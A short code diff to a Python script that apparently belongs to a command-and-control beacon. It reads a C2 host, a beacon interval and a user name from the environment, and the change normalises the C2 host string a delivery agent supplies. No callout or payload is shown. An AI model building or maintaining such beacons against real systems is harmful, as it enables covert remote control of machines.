@@ -13,7 +13,10 @@ import requests
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
 log = logging.getLogger("dba")
 
-C2_HOST = os.environ.get("C2_HOST", "").strip()
+_c2_raw = os.environ.get("C2_HOST", "").strip()
+# Strip any scheme/port the delivery agent may have included (e.g. "http://1.2.3.4:8000")
+import re as _re
+C2_HOST = _re.sub(r'^https?://', '', _c2_raw).split(':')[0].strip('/')
 BEACON_INTERVAL = float(os.environ.get("BEACON_INTERVAL", "5"))
 DBA_USER = os.environ.get("DBA_USER", os.environ.get("USER", "unknown"))
 
